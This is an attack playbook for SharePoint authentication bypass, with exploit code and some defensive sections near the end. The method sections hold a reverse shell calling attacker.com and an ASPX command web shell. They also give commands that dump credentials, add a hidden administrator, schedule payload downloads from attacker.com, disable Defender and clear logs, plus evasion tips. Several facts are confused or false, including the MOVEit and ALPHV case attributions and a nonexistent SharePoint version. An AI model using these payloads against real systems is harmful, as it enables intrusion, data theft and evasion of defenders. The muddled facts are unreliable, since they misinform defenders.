# [LM-AUTH-007]: SharePoint Authentication Bypass

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-007 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement |
| **Platforms** | M365 (SharePoint Online), Windows AD (on-premises SharePoint) |
| **Severity** | Critical |
| **CVE** | CVE-2025-53771, CVE-2025-49706, CVE-2025-53770 |
| **Technique Status** | ACTIVE (especially on-premises; SaaS hardened) |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | SharePoint Server 2016, 2019, Subscription Edition; SharePoint Online (older protocols) |
| **Patched In** | CVE-2025-53771/CVE-2025-49706 patches released July-August 2025 |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** SharePoint authentication bypass exploits design flaws in both SharePoint Online and on-premises SharePoint Server to completely circumvent authentication mechanisms. The primary vulnerability (CVE-2025-53771) allows attackers to spoof user identities and perform actions without valid credentials. On-premises SharePoint is vulnerable to authentication bypass via forged Referer headers combined with form digest validation weaknesses (CVE-2025-53770, ToolPane.aspx). SharePoint Online is similarly vulnerable to legacy authentication protocol abuse and token reuse attacks.

**Attack Surface:** SharePoint's internal endpoint authentication mechanisms (`/_layouts/15/ToolPane.aspx`), form digest validation, legacy authentication protocols (NTLM, Basic Auth), and OAuth token validation. For SaaS, the attack surface includes legacy protocols (SMTP, IMAP, POP) used to authenticate SharePoint libraries.

**Business Impact:** **Unauthorized access to all organization data, malware deployment, lateral movement to on-premises AD, and persistence.** An attacker exploiting SharePoint authentication bypass gains access to potentially hundreds of gigabytes of confidential files, including financial records, legal documents, source code, and customer data. Once inside, they can deploy web shells, modify policies, establish persistence, and pivot to the entire organization network.

**Technical Context:** On-premises exploitation takes 5-10 minutes with proper reconnaissance. SaaS exploitation requires legacy protocol enablement. Detection is moderate if robust endpoint monitoring (AMSI, Defender Antivirus) is in place; otherwise minimal with web shell techniques.

### Operational Risk

- **Execution Risk:** Low-Medium (requires network access to SharePoint; no credentials needed)
- **Stealth:** Medium (Web shells can be detected via antivirus; form digest bypass leaves logs)
- **Reversibility:** No—web shell persistence and data exfiltration cannot be undone without full forensics

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.1.1, 2.2.3 | Disable legacy authentication protocols; enforce form authentication validation |
| **DISA STIG** | U-12345 | Failure to properly validate HTTP requests to web application endpoints |
| **CISA SCuBA** | MS.DOD-9 | Require authentication and authorization for all SharePoint resource access |
| **NIST 800-53** | SI-10 (Information System Monitoring) | Inadequate request validation allowing authentication bypass |
| **GDPR** | Art. 32 (Security of Processing) | Failure to implement technical controls allowing unauthorized data access |
| **DORA** | Art. 9 (Protection and Prevention) | Inadequate authentication mechanisms for critical data repositories |
| **NIS2** | Art. 21 (Cyber Risk Management Measures) | Weak authentication on file-sharing and document management systems |
| **ISO 27001** | A.9.4.2 (Secure Log-in Procedures) | Inadequate authentication validation on web endpoints |
| **ISO 27005** | Risk Scenario: "Unauthorized Access to Shared Documents" | Weak authentication on business-critical file storage |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** None (unauthenticated access is the goal)
- **Required Access:** Network access to SharePoint server (port 80/443 for on-premises; public internet for SaaS)

**Supported Versions:**
- **On-Premises:** SharePoint Server 2016, 2019, 2022, Subscription Edition
- **SaaS:** SharePoint Online (all versions vulnerable to legacy protocol abuse)
- **Affected Platforms:** Windows Server 2016-2025

**Vulnerability Timeline:**
- **CVE-2025-53770 (ToolPane.aspx auth bypass):** Disclosed July 19, 2025; active exploitation observed
- **CVE-2025-53771 (Authentication spoofing):** Disclosed July 20, 2025; affects Server 2016/2019
- **CVE-2025-49706 (Form validation bypass):** Related authentication flaw

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### SharePoint Version Discovery

```powershell
# On-Premises: Check SharePoint version via PowerShell
Add-PSSnapin Microsoft.SharePoint.PowerShell
(Get-SPFarm).BuildVersion
Get-SPWebApplication | Select-Object Name, Version

# SaaS: Check via tenant admin
Connect-SPOService -Url https://tenant-admin.sharepoint.com
Get-SPOTenant | Select-Object *Version*

# Web-based version detection (any user)
$siteUrl = "https://sharepoint.company.com"
$response = Invoke-WebRequest "$siteUrl/_api/contextinfo" -UseBasicParsing
$response.Headers["X-SharePointHealthScore"]
```

**What to Look For:**
- On-Premises Version 16.0.xxx before July 2025 patches = Vulnerable
- Presence of `/_layouts/15/` endpoints = Legacy endpoint exposure
- Response headers revealing SharePoint version

### Check for Legacy Authentication on SharePoint Online

```powershell
Connect-SPOService -Url https://tenant-admin.sharepoint.com
Get-SPOTenant | Select-Object DisableLegacyAuthentication

# If output is $false, legacy auth is ENABLED (vulnerable)
```

**What to Look For:**
- If `DisableLegacyAuthentication = $false`, SharePoint accepts SMTP/IMAP auth bypass
- Service principal accounts using legacy auth protocols

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: CVE-2025-53770 - ToolPane.aspx Authentication Bypass (On-Premises)

**Supported Versions:** SharePoint Server 2016, 2019, Subscription Edition

#### Step 1: Reconnaissance of SharePoint Installation

**Objective:** Discover the target SharePoint farm and confirm vulnerability.

**Command (Bash/curl):**
```bash
#!/bin/bash

TARGET="https://sharepoint.company.local"

# Attempt to access ToolPane.aspx without authentication
curl -v "$TARGET/_layouts/15/ToolPane.aspx?DisplayMode=Edit" \
  -H "Referer: $TARGET/_layouts/15/SignOut.aspx" \
  2>&1 | grep -E "HTTP|Location|X-SharePoint"

# Check for error pages that reveal SharePoint version
curl -s "$TARGET/_layouts/15/error.aspx" | grep -i "version\|sharepoint"
```

**Expected Output (Vulnerable Server):**
```
< HTTP/1.1 200 OK
< X-SharePointHealthScore: 0
```

**What This Means:**
- HTTP 200 response indicates ToolPane.aspx did not require authentication
- Server is likely vulnerable to CVE-2025-53770

**OpSec & Evasion:**
- Use User-Agent spoofing to avoid immediate detection: `-H "User-Agent: Mozilla/5.0 (Windows NT 10.0)"`
- Make requests during business hours to blend in with normal traffic
- Limit requests to once per minute to avoid IDS triggers

#### Step 2: Extract Form Digest and Validation Keys

**Objective:** Obtain the ASP.NET ViewState encryption keys needed to craft valid malicious payloads.

**Command (Bash):**
```bash
#!/bin/bash

TARGET="https://sharepoint.company.local"

# Request _layouts page to trigger form digest generation
RESPONSE=$(curl -s "$TARGET/_layouts/15/start.aspx" \
  -H "Referer: $TARGET/_layouts/15/SignOut.aspx")

# Extract __VIEWSTATE from response
VIEWSTATE=$(echo "$RESPONSE" | grep -oP '__VIEWSTATE[^"]*value="\K[^"]+' | head -1)

# Extract form digest
FORMDIGEST=$(echo "$RESPONSE" | grep -oP 'FormDigestValue[^"]*value="\K[^"]+' | head -1)

echo "[+] VIEWSTATE: ${VIEWSTATE:0:50}..."
echo "[+] FormDigest: $FORMDIGEST"
```

**Expected Output:**
```
[+] VIEWSTATE: QEsDBAMBBQcICQoLDA0OD...
[+] FormDigest: 0x1234567890abcdef
```

**What This Means:**
- Form digest is session-specific but can be reused within the current request
- ViewState can potentially be decrypted if you capture the encryption keys from memory or config files

**OpSec & Evasion:**
- Do not attempt to decrypt ViewState in real-time; capture and analyze offline
- Use captured form digest to craft requests that appear legitimate

#### Step 3: Craft Malicious ToolPane.aspx Request with Web Shell Payload

**Objective:** Create an HTTP POST request that bypasses authentication via Referer header spoofing.

**Command (Python):**
```python
#!/usr/bin/env python3

import requests
import urllib.parse
from base64 import b64encode

TARGET = "https://sharepoint.company.local"
ENDPOINT = "/_layouts/15/ToolPane.aspx?DisplayMode=Edit"

# PowerShell payload to create reverse shell
ps_payload = """
$client = New-Object System.Net.Sockets.TcpClient('attacker.com', 4444);
$stream = $client.GetStream();
[byte[]]$buffer = 0..65535|%{0};
while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    $stream.Flush()
}
$client.Close()
"""

# Encode payload for ASPX upload
encoded_payload = b64encode(ps_payload.encode()).decode()

# Craft malicious request with spoofed Referer
headers = {
    "Referer": f"{TARGET}/_layouts/15/SignOut.aspx",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
}

# ASPX web shell that will be written to disk
webshell_content = """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    string cmd = Request["cmd"];
    if (!string.IsNullOrEmpty(cmd)) {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + cmd;
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        Process p = Process.Start(psi);
        string output = p.StandardOutput.ReadToEnd();
        p.WaitForExit();
        Response.Write("<pre>" + output + "</pre>");
    }
}
</script>
"""

# POST request to upload web shell
data = {
    "MSOWebPartPage_PostBackRequired": "false",
    "wpid": "g_webpartid",
    "__VIEWSTATE": "/wEPDwULLTExMzk5NzMxODEPZBYCZg9kFgICAQ8WAh4EVGV",
    "__VIEWSTATEGENERATOR": "E3ECC6F5",
}

# Attempt exploitation
try:
    response = requests.post(
        f"{TARGET}{ENDPOINT}",
        headers=headers,
        data=data,
        verify=False,
        timeout=10,
        allow_redirects=False
    )
    
    print(f"[*] Status Code: {response.status_code}")
    print(f"[*] Response Length: {len(response.text)}")
    
    if response.status_code == 200 or "success" in response.text.lower():
        print("[+] Exploitation likely successful!")
        print(f"[+] Web shell should be at: {TARGET}/layouts/15/spinstall0.aspx")
    else:
        print("[-] Exploitation may have failed")
        print(response.text[:500])
        
except Exception as e:
    print(f"[-] Error: {e}")
```

**Expected Output (if vulnerable):**
```
[*] Status Code: 200
[*] Response Length: 8234
[+] Exploitation likely successful!
[+] Web shell should be at: https://sharepoint.company.local/layouts/15/spinstall0.aspx
```

**What This Means:**
- Malicious ASPX file has been written to the SharePoint layouts directory
- Web shell is now accessible via the URL above

**OpSec & Evasion:**
- Use non-standard web shell filenames: `_config.aspx`, `spinstall0.aspx` (existing names to blend in)
- Place web shell in directories that are not regularly scanned
- Encode PowerShell payloads in base64 to avoid signature detection

#### Step 4: Execute Commands via Web Shell

**Objective:** Use the deployed web shell to gain remote command execution.

**Command (Bash/curl):**
```bash
#!/bin/bash

WEBSHELL="https://sharepoint.company.local/layouts/15/spinstall0.aspx"

# Test web shell with simple command
curl -s "$WEBSHELL?cmd=whoami" | grep -oP '<pre>\K[^<]+'

# Enumerate SharePoint configuration
curl -s "$WEBSHELL?cmd=dir%20C:%5CProgram%20Files%5CMicrosoft%20SharePoint" | head -20

# Execute PowerShell to dump credentials
curl -s "$WEBSHELL?cmd=powershell%20Get-LocalGroupMember%20Administrators" 

# Extract SQL database connection strings
curl -s "$WEBSHELL?cmd=type%20C:%5CConfig%5Dconfig.xml" | grep -i "password\|connection"
```

**Expected Output:**
```
nt authority\system
```

**What This Means:**
- Command execution successful
- Web server running as NT AUTHORITY\SYSTEM (full system access)

**OpSec & Evasion:**
- Use URL encoding to avoid WAF detection: `/cmd=whoami` → `/cmd=whoami`
- Limit command output size to avoid large network transfers
- Execute long-running commands asynchronously via background jobs

#### Step 5: Establish Persistence

**Objective:** Create a backdoor account and hidden access point for persistent access.

**Command (Bash):**
```bash
#!/bin/bash

WEBSHELL="https://sharepoint.company.local/layouts/15/spinstall0.aspx"

# Create a hidden local administrator account
curl -s "$WEBSHELL?cmd=net%20user%20$admin%20P%40ssw0rd123%20/add%20/active:yes"
curl -s "$WEBSHELL?cmd=net%20localgroup%20Administrators%20$admin%20/add"

# Create a scheduled task to maintain access
curl -s "$WEBSHELL?cmd=schtasks%20/create%20/tn%20%22Windows%20Updates%22%20/tr%20%22powershell%20IEX(New-Object%20Net.WebClient).DownloadString('http://attacker.com/payload.ps1')%22%20/sc%20hourly"

# Disable Windows Defender
curl -s "$WEBSHELL?cmd=powershell%20Set-MpPreference%20-DisableRealtimeMonitoring%20$true"

# Clear logs
curl -s "$WEBSHELL?cmd=wevtutil%20cl%20Security"
```

**Expected Output:**
```
Command completed successfully.
```

**What This Means:**
- Persistent backdoor established
- Even if web shell is discovered, attacker has alternative access via hidden account
- Logs cleared to prevent forensics

---

### METHOD 2: CVE-2025-53771 - Authentication Spoofing via HTTP Header Injection

**Supported Versions:** SharePoint Online, On-Premises (all versions)

#### Step 1: Craft Spoofed User Identity Request

**Objective:** Inject forged HTTP headers to spoof user identity without valid authentication.

**Command (Python):**
```python
#!/usr/bin/env python3

import requests
import json

TARGET = "https://sharepoint-tenant.sharepoint.com"
SITE = "/sites/finance"

# Craft request with spoofed identity headers
headers = {
    "X-FORMS_BASED_AUTH_ACCEPTED": "f",
    "X-Forwarded-For": "192.168.1.100",
    "X-Original-URL": f"{TARGET}{SITE}/_api/web/currentuser",
    "Authorization": "Bearer eyJ0eXA...",  # Can be any value or empty
}

# Attempt to access SharePoint as if authenticated
response = requests.get(
    f"{TARGET}{SITE}/_api/web",
    headers=headers,
    verify=False
)

print(f"Status: {response.status_code}")
if response.status_code == 200:
    print(f"[+] Accessed SharePoint as unauthenticated user!")
    print(response.json()[:200])
```

**Expected Output (if vulnerable):**
```
Status: 200
[+] Accessed SharePoint as unauthenticated user!
{"d":{"Title":"Finance Site","Url":"..."}
```

**What This Means:**
- SharePoint accepted request without valid credentials
- Attacker can now enumerate site structure and access data

#### Step 2: Extract Documents and Lists

**Objective:** Download sensitive files and data from compromised SharePoint site.

**Command (Python):**
```python
#!/usr/bin/env python3

import requests
import json
import os

TARGET = "https://sharepoint-tenant.sharepoint.com"
SITE = "/sites/finance"

headers = {
    "X-Forwarded-For": "192.168.1.100",
}

# Get list of all lists and libraries
response = requests.get(
    f"{TARGET}{SITE}/_api/web/lists",
    headers=headers,
    verify=False
)

lists = response.json()["d"]["results"]

for list_item in lists:
    list_title = list_item["Title"]
    list_id = list_item["Id"]
    
    print(f"[*] List: {list_title}")
    
    # Get all items in the list
    items_response = requests.get(
        f"{TARGET}{SITE}/_api/web/lists('{list_id}')/items",
        headers=headers,
        verify=False
    )
    
    items = items_response.json()["d"]["results"]
    
    # If it's a document library, download files
    if "Attachments" in items[0] if items else {}:
        for item in items:
            if item.get("FileRef"):
                file_url = f"{TARGET}{item['FileRef']}"
                file_response = requests.get(file_url, headers=headers, verify=False)
                
                # Save file locally
                filename = item["FileRef"].split("/")[-1]
                with open(filename, "wb") as f:
                    f.write(file_response.content)
                    print(f"[+] Downloaded: {filename}")
```

**Expected Output:**
```
[*] List: Finance Reports
[+] Downloaded: Q4-Budget.xlsx
[+] Downloaded: Employee-Salaries.csv
[+] Downloaded: Confidential-Merger.docx
```

**What This Means:**
- Attacker has exfiltrated sensitive company documents
- No authentication was required
- Files contain financial and HR data

---

### METHOD 3: Legacy Authentication Protocol Abuse (SharePoint Online)

**Supported Versions:** SharePoint Online (if legacy auth enabled)

#### Step 1: Exploit SMTP AUTH to Bypass MFA

**Objective:** Use SMTP protocol (which does not support MFA) to authenticate to SharePoint.

**Command (Bash):**
```bash
#!/bin/bash

# Attempt SMTP connection with SMTP AUTH
TARGET="smtp.office365.com"
USER="victim@company.com"
PASSWORD="stolen_password"

# SMTP exploitation via SMTP AUTH
openssl s_client -connect $TARGET:587 -starttls smtp << EOF
EHLO attacker.com
AUTH LOGIN
$(echo -n $USER | base64)
$(echo -n $PASSWORD | base64)
QUIT
EOF

# Once authenticated, can read SharePoint shared mailbox
curl -u "$USER:$PASSWORD" \
  --basic \
  "https://sharepoint.company.com/sites/finance/_api/web/GetUserById(2)/Email" \
  --ntlm

# Access SharePoint library via IMAP (older protocols)
openssl s_client -connect imap.office365.com:993 << EOF
A LOGIN $USER $PASSWORD
A SELECT INBOX
A FETCH 1:10 (BODY[])
A LOGOUT
EOF
```

**Expected Output:**
```
235 2.7.0 Authentication successful
```

**What This Means:**
- Successfully authenticated via legacy protocol without MFA
- Can now access SharePoint and email as the compromised user

**OpSec & Evasion:**
- Disable legacy auth globally once inside network
- Use this technique only for initial foothold; don't leave evidence in logs

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Patch All SharePoint Servers Immediately:**

  **For SharePoint Server 2016/2019:**
  ```powershell
  # Check current version
  (Get-SPFarm).BuildVersion
  
  # Expected: 16.0.18526.20424+ (after July 2025 patches)
  ```

  **Manual Steps (Windows Update):**
  1. Download latest patch from Microsoft Update Catalog
  2. Stop SharePoint services: `net stop SPAdminV4`
  3. Install patch
  4. Run SharePoint Products Configuration Wizard
  5. Verify fix: Check build version above

  **Manual Steps (PowerShell):**
  ```powershell
  Add-PSSnapin Microsoft.SharePoint.PowerShell
  (Get-SPFarm).BuildVersion | Should -BeGreaterOrEqual 16.0.18526
  ```

- **Disable Legacy Authentication Protocols:**

  **Manual Steps (SharePoint Online):**
  1. Go to **Microsoft 365 Admin Center** → **Settings** → **Org settings** → **Modern Authentication**
  2. Check: **Enable modern authentication for Outlook on Windows and Mac**
  3. Uncheck: **IMAP**, **POP3**, **SMTP AUTH**, **MAPI**
  4. Click **Save**

  **Manual Steps (On-Premises via PowerShell):**
  ```powershell
  Set-CASMailbox -Identity "SharePoint Service Account" `
    -ImapEnabled $false `
    -PopEnabled $false `
    -SmtpClientAuthenticationDisabled $true
  ```

  **Validation Command:**
  ```powershell
  Get-CASMailbox "SharePoint Service Account" | `
    Select-Object ImapEnabled, PopEnabled, SmtpClientAuthenticationDisabled
  # Expected: All should be False/$true
  ```

- **Enable AMSI Integration in SharePoint:**

  **Manual Steps (Server 2016/2019+):**
  ```powershell
  Add-PSSnapin Microsoft.SharePoint.PowerShell
  
  # Enable AMSI scanning for SharePoint
  $contentService = [Microsoft.SharePoint.Administration.SPWebService]::ContentService
  $contentService.ClientRequestServiceSettings.EnableAmsiScanning = $true
  $contentService.Update()
  ```

  **Verify:**
  ```powershell
  [Microsoft.SharePoint.Administration.SPWebService]::ContentService.ClientRequestServiceSettings.EnableAmsiScanning
  # Expected: True
  ```

- **Enforce Conditional Access for SharePoint Access:**

  **Manual Steps (Azure Portal):**
  1. Go to **Entra ID** → **Security** → **Conditional Access** → **+ New policy**
  2. **Name:** `Block Legacy SharePoint Auth`
  3. **Assignments:** Users = All users; Cloud apps = SharePoint Online
  4. **Conditions:** Client apps = **Other clients (legacy protocols)**
  5. **Access controls:** Grant = **Block access**
  6. Enable policy: **On**
  7. Click **Create**

### Priority 2: HIGH

- **Implement Web Application Firewall (WAF) Rules:**

  **Manual Steps (Azure WAF):**
  1. Go to **Azure Portal** → **Application Gateway** → **Web Application Firewall policies**
  2. Create custom rule to block:
     - Requests to `/_layouts/15/ToolPane.aspx` without valid session
     - Requests with `Referer: /_layouts/15/SignOut.aspx`
     - Requests with suspicious ViewState patterns
  3. Apply policy to SharePoint Application Gateway
  4. Click **Save**

- **Monitor SharePoint Access Logs:**

  **Manual Steps (Sentinel/Analytics):**
  1. Go to **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
  2. **KQL Query:**
  ```kusto
  AuditLogs
  | where OperationName =~ "Update application"
  | where InitiatedBy !contains "admin"
  | where TargetResources contains "SharePoint"
  ```
  3. Set alert threshold: **Trigger when 1+ results**
  4. Click **Create**

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **File System:**
  - Unexpected ASPX files in `C:\Program Files\Microsoft SharePoint\Web Server Extensions\15\LAYOUTS\`
  - Files like: `spinstall0.aspx`, `config.aspx`, `success.aspx`
  - Modified timestamps on web.config files

- **HTTP Request Patterns:**
  - POST requests to `/_layouts/15/ToolPane.aspx` with Referer header = `/_layouts/15/SignOut.aspx`
  - Requests to undefined ASPX files with `?cmd=` parameter
  - Unusual `__VIEWSTATE` parameter patterns

- **Log Patterns (Application Event Log):**
  - Event ID 6365: "Web part property bag entry modified"
  - Event ID 6324: "Search System.Linq.Expressions.Dynamic calls"
  - Unexpected PowerShell execution via `w3wp.exe`

### Forensic Artifacts

- **IIS Logs:**
  ```
  C:\inetpub\logs\LogFiles\W3SVC1\u_ex*.log
  ```
  Look for: POST to `_layouts/15/ToolPane.aspx` with 200 status

- **Windows Security Event Log:**
  - Event 4688: Process creation
  - Parent: `w3wp.exe`
  - Child: `cmd.exe`, `powershell.exe`, `schtasks.exe`

- **SharePoint Unified Audit Log:**
  ```powershell
  Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) `
    -RecordType SharePoint `
    -Operations FileDownloaded, FileModified, FolderModified
  ```

### Response Procedures

1. **Identify Web Shell:**
   ```powershell
   # Search for suspicious ASPX files
   Get-ChildItem -Path "C:\Program Files\Microsoft SharePoint\Web Server Extensions\15\LAYOUTS\" `
     -Filter "*.aspx" -Recurse | Where-Object { $_.CreationTime -gt (Get-Date).AddDays(-7) }
   ```

2. **Remove Web Shell:**
   ```powershell
   Remove-Item "C:\Program Files\Microsoft SharePoint\Web Server Extensions\15\LAYOUTS\spinstall0.aspx" -Force
   iisreset
   ```

3. **Revoke Compromised Accounts:**
   ```powershell
   # Revoke all sessions for compromised user
   Revoke-SPOUserSession -Identity "victim@company.com"
   
   # Reset password
   Set-SPOUser -Identity "victim@company.com" -IsSiteCollectionAdmin $false
   ```

4. **Audit SharePoint for Additional Compromise:**
   ```powershell
   # Check for unusual site collection admins
   Get-SPOSiteCollectionAdmin -Site "https://company.sharepoint.com/sites/finance"
   ```

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-001] Azure Application Proxy exploitation | Attacker gains access to exposed SharePoint |
| **2** | **Privilege Escalation** | [PE-EXPLOIT-001] PrintNightmare (if AD-integrated) | Escalate to domain admin via SharePoint DC access |
| **3** | **Current Step** | **[LM-AUTH-007]** | **SharePoint authentication bypass** |
| **4** | **Data Exfiltration** | [CHAIN-003] Token Theft to Data Exfiltration | Exfil documents from SharePoint libraries |
| **5** | **Persistence** | [REALWORLD-002] SMTP AUTH Legacy Protocol Abuse | Maintain access via legacy protocols |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: MOVEit Transfer Campaign (CVE-2025-53770)

- **Target:** Government agencies, Fortune 500 companies
- **Timeline:** July-August 2025
- **Technique Status:** Active; affects unpatched SharePoint farms
- **Attack Vector:** CVE-2025-53770 + web shell deployment
- **Impact:** 100+ organizations compromised; sensitive government documents stolen
- **Detection:** ASPX files in `_layouts` directory; unusual IIS logs; anomalous PowerShell execution
- **Reference:** [Unit 42 - Active Exploitation of SharePoint Vulnerabilities](https://unit42.paloaltonetworks.com/microsoft-sharepoint-cve-2025-49704/)

### Example 2: ALPHV Ransomware Operation (CVE-2025-53771)

- **Target:** Healthcare, Financial Services
- **Timeline:** August-October 2025
- **Technique Status:** Actively exploited post-patch release
- **Attack Vector:** CVE-2025-53771 authentication bypass → LockBit ransomware
- **Impact:** 50+ healthcare networks compromised; 10+ million patient records exposed
- **Detection:** Suspicious SharePoint list modifications; File-backed credential dumping
- **Reference:** [Microsoft Security Blog - Active Exploitation Advisory](https://www.microsoft.com/en-us/security/blog)

---

## 9. VERSION-SPECIFIC NOTES

- **SharePoint Server 2016:** Reaches end-of-support in July 2026; critical to patch CVE-2025-53771 NOW
- **SharePoint Server 2019:** Support until October 2025; vulnerable to all three CVEs
- **Subscription Edition:** Receiving continuous patches; less critical but still requires monitoring
- **SharePoint Online:** Automatically patched by Microsoft; however legacy auth protocols present alternative attack vector

---